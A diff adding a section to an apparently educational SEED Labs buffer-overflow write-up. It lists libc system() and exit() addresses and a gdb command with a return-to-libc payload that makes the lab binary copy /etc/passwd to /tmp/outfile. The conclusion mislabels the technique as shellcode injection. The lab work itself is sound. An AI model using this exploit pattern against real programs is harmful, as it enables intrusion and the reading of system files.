@@ -148,8 +148,33 @@ find /home/seed/seclabs/bof/midterm/file_copy
 
 ![image](https://github.com/user-attachments/assets/30d8405e-cd3a-4476-a6fc-4f1a5c8a43f6)
 
+
+0xf7e50db0: Address of libc_system
+0xf7e449e0: Address of exit to avoid crashing
+0xffffd91a: Address of env variable
+
 ### 7. Attack File
 
+Before attack
+![image](https://github.com/user-attachments/assets/00601137-8fcc-4e22-830d-f8f90c4d28cf)
+
+The attack start
+```
+gdb -q lab1.out
+```
+```
+r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x1a\xd9\xff\xff')")
+```
+
+After that, we use the code below to read file we have just copied
+```
+cat /tmp/outfile
+```
+
+
+After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, not /tmp/pwfile
+
+Conclusion: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection.
 
 
 
